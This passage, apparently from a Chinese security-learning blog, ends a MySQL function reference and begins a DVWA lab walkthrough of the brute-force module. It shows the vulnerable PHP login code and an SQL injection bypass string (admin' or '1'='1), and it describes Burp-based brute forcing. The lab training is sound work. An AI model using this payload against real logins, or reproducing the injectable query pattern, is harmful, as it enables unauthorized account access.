class="hljs-string">&#x27;10.122.89.47&#x27;</span>);<br><span class="hljs-keyword">select</span> inet_ntoa(<span class="hljs-number">175790383</span>);<br> <br>八、类型转化函数<br>为了进行数据类型转化，mysql提供了<span class="hljs-built_in">cast</span>()函数，它可以把一个值转化为指定的数据类型。类型有：<span class="hljs-type">binary</span>,<span class="hljs-type">char</span>,<span class="hljs-type">date</span>,<span class="hljs-type">time</span>,datetime,signed,unsigned<br>示例：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">cast</span>(now() <span class="hljs-keyword">as</span> signed <span class="hljs-type">integer</span>),curdate()<span class="hljs-operator">+</span><span class="hljs-number">0</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;f&#x27;</span><span class="hljs-operator">=</span><span class="hljs-type">binary</span> <span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span><span class="hljs-operator">=</span><span class="hljs-built_in">cast</span>(<span class="hljs-string">&#x27;f&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">binary</span>);<br> <br>九、系统信息函数<br>database() 返回当前数据库名<br>benchmark(count,expr) 将表达式expr重复运行count次<br>connection_id() 返回当前客户的连接id<br>found_rows() 返回最后一个<span class="hljs-keyword">select</span>查询进行检索的总行数<br><span class="hljs-keyword">user</span>()或<span class="hljs-built_in">system_user</span>() 返回当前登陆用户名<br>version() 返回mysql服务器的版本<br>示例：<br><span class="hljs-keyword">select</span> database(),version(),<span class="hljs-keyword">user</span>();<br>selectbenchmark(<span class="hljs-number">9999999</span>,<span class="hljs-built_in">log</span>(rand()<span class="hljs-operator">*</span>pi()));#该例中,mysql计算<span class="hljs-built_in">log</span>(rand()<span class="hljs-operator">*</span>pi())表达式<span class="hljs-number">9999999</span>次。<br></code></pre></td></tr></table></figure>

<p>进行尝试：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-21-37-27.png" alt="函数执行" class="lazyload"></p>
<h2 id="数据库的数据类型"><a href="#数据库的数据类型" class="headerlink" title="数据库的数据类型"></a>数据库的数据类型</h2><p>mysql中主要类型：文本、数字、日期<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-21-18-38.png" alt="数据类型" class="lazyload"></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li>sql对大小写不敏感。</li>
<li>分号是在数据系统中分隔每条sql语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的语句。</li>
<li>条件值周围使用的是单引号。sql使用单引号来环绕文本值（也接受双引号）。如果是数值，不要使用引号。</li>
</ul>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="DVWA靶场通关" class="lazyload">
                    <h1>DVWA靶场通关</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月15日</a>
            <a><i class="nexmoefont icon-areachart"></i>21.5k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 112 分钟</a>
        </div>

        <article>
            
                <h2 id="DVWA靶场简介"><a href="#DVWA靶场简介" class="headerlink" title="DVWA靶场简介"></a>DVWA靶场简介</h2><p>DVWA（Damn Vulnerable Web Application）和pikachu一样是一个用来进行安全脆弱性鉴定的PHP/MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。它一共包含了十个模块：brute force(暴力破解)、command inject(命令行注入)、CSRF(跨站请求伪造)、File inclusion(文件包含)、file Upload(文件上传)、insecure Captcha(不安全的验证码)、SQL Inject(sql注入)、XSS(跨站脚本攻击)。包含了OWASP TOP 10所有攻击漏洞练习环境，供大家学习。<br>DVWA还可以手动调整安全级别(low、medium、high、impossible)级别越高防护越严格，渗透难度越大。</p>
<h2 id="DVWA安装"><a href="#DVWA安装" class="headerlink" title="DVWA安装"></a>DVWA安装</h2><p>和pikachu靶场一样将<a target="_blank" rel="noopener" href="https://github.com/ethicalhack3r/DVWA/archive/master.zip">DWAV的源码</a>解压到phpstudy的www目录下,修改配置文件,启动phpstudy然后在浏览器访问网站进行安装<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-11-57-53.png" alt="安装流程" class="lazyload"><br>安装完成我们就可以进行测试学习了，如果英文不是很强可以借助浏览器翻译来进行学习<br>如果安装完成不用登录就可以访问内容我们可以这样操作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-15-43-54.png" alt="加登录" class="lazyload"></p>
<h2 id="DVWA-–-暴力破解（Brute-Force）"><a href="#DVWA-–-暴力破解（Brute-Force）" class="headerlink" title="DVWA – 暴力破解（Brute Force）"></a>DVWA – 暴力破解（Brute Force）</h2><p>暴力破解：指的是用字典通过穷举法猜测用户口令：<br><strong>low难度下的暴力破解：</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-12-14-57.png" alt="靶场显示" class="lazyload"><br>源码解析：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-41-02.png" alt="文件位置" class="lazyload"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//检查变量是否设置，查看有无Login参数</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// 获取用户名</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br><br> <span class="hljs-comment">// 获取密码</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-comment">// 将密码使用md5加密</span><br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// 构造sql语句，这里并没有做处理 可以直接用万能密码手工注入进行登录</span><br> <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br> <span class="hljs-comment">//查询的sql语句并把结果保存在result中 查到了，保存用户具体信息 未查到，就在页面上输入错误结果，result为空</span><br> <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><span class="hljs-comment">//结果存在且数量为1说明查到了</span><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>  <span class="hljs-comment">// 获取关联数据row row是键值对</span><br>  <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );<br>  <span class="hljs-comment">//获取登录成功的图片</span><br>  <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>  <span class="hljs-comment">// 登录成功，输出到页面</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// 未查到登录失败，输出错误信息到页面</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><span class="hljs-comment">//释放资源</span><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>经过源码分析我们发现后台直接将输入的用户名拼接到sql中查询，<em>也没有对密码和用户名进行校验</em>，我们可以构造恶意语句<code>admin&#39; or &#39;1&#39;=&#39;1</code>让后边条件为永真将数据库用户存入变量，使变量中有值，从而登录成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-13-45-56.png" alt="万能密码" class="lazyload"><br>可以使用burp进行暴破，操作如下：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-37-49.png" alt="low暴破" class="lazyload"></p>
<p><strong>medium难度下的暴力破解</strong><br>源码解析：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-44-12.png" alt="文件位置" class="lazyload"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//检测是否存在在Login变量</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// Sanitise username input 获取用户名存入user</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br> <span class="hljs-comment">//user中x00，n，r，，’，”，x1a转义，防SQL注入</span><br> <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br> <span class="hljs-comment">// 获取到密码 并转义 防sql注入</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <span class="hljs-comment">//密码md5加密</span><br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// Check the database</span><br> <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br> <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>  <span class="hljs-comment">// Get users details</span><br>  <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );<br>  <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>  <span class="hljs-comment">// Login successful</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Login failed</span><br>  sleep( <span class="hljs-number">2</span> );<span class="hljs-comment">//失败后会延时两秒</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>中等难度他的源码对于登录这方面没有做太多改动，因此他的暴破过程和low难度过程基本一样，只不过对一些字符使用mysql_real_escape_string这个函数进行了转义，有效防止了通过万能密钥注入的方式登录<br>操作和low一样<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-18-23-45.png" alt="medium难度暴力破解" class="lazyload"><br>防止万能密钥的登陆<code>admin&#39; or &#39;1&#39; = &#39;1</code>输入用户名为这个，再随便输密码显示登录失败<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-18-29-16.png" alt="万能密钥" class="lazyload"></p>
<p><strong>high难度下的暴力破解</strong><br>源码解析<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-15-17-41-49.png" alt="文件位置" class="lazyload"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br> <span class="hljs-comment">// Check Anti-CSRF token</span><br> checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br> <span class="hljs-comment">// Sanitise username input</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br> <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );<br> <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br> <span class="hljs-comment">// Sanitise password input</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );<br> <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// Check database</span><br> <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br> <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>  <span class="hljs-comment">// Get users details</span><br>  <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );<br>  <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];<br><br>  <span class="hljs-comment">// Login successful</span><br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// Login failed</span><br>  sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );<br>  <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br> &#125;<br><br> ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以明显的看出添加了token检验机制来增加暴破的难度，token在计算机身份认证中是令牌(临时)的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。针对带token验证的防暴破机制我们可以使用burp来绕过。<br>演示：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-16-10-50-10.png" alt="带有token如何暴破" class="lazyload"></p>
<p><strong>impossible难度</strong><br>源码解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//这里使用post获取参数</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) ) &#123;<br> <span class="hljs-comment">// 怎加token检验</span><br> checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br> <span class="hljs-comment">// 过滤用户名</span><br> <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br> <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );<br> <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br> <span class="hljs-comment">// 过滤密码并且md5加密密码</span><br> <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br> <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );<br> <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br> <span class="hljs-comment">// 失败登录三次锁定时间</span><br> <span class="hljs-variable">$total_failed_login</span> = <span class="hljs-number">3</span>;<br> <span class="hljs-variable">$lockout_time</span>       = <span class="hljs-number">15</span>;<br> <span class="hljs-variable">$account_locked</span>     = <span class="hljs-literal">false</span>;<br><br> <span class="hljs-comment">// 验证用户名</span><br> <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR );<br> <span class="hljs-variable">$data</span>-&gt;execute();<br> <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;fetch();<br><br> <span class="hljs-comment">//检测账户是否被锁定 尝试大于三次锁定账户</span><br> <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="hljs-variable">$total_failed_login</span> ) )  &#123;<br>  <span class="hljs-comment">// User locked out.  Note, using this method would allow for user enumeration!</span><br>  <span class="hljs-comment">//$html .= &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><br>  <span class="hljs-comment">// 计算用户是否能重新登录</span><br>  <span class="hljs-variable">$last_login</span> = strtotime( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ] );<br>  <span class="hljs-variable">$timeout</span>    = <span class="hljs-variable">$last_login</span> + (<span class="hljs-variable">$lockout_time</span> * <span class="hljs-number">60</span>);<br>  <span class="hljs-variable">$timenow</span>    = time();<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">  print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">  print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-comment">// 检测所动账户时间是否够了并解锁账户</span><br>  <span class="hljs-keyword">if</span>( <span class="hljs-variable">$timenow</span> &lt; <span class="hljs-variable">$timeout</span> ) &#123;<br>   <span class="hljs-variable">$account_locked</span> = <span class="hljs-literal">true</span>;<br>   <span class="hljs-comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br>  &#125;<br> &#125;<br><br> <span class="hljs-comment">// 检测用户名和密码与数据库是否匹配</span><br> <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::PARAM_STR);<br> <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass</span>, PDO::PARAM_STR );<br> <span class="hljs-variable">$data</span>-&gt;execute();<br> <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;fetch();<br><br> <span class="hljs-comment">// 如果登录有效</span><br> <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$account_locked</span> == <span class="hljs-literal">false</span> ) ) &#123;<br>  <span class="hljs-comment">// 获取用户登录测试，头像和最近登录</span><br>  <span 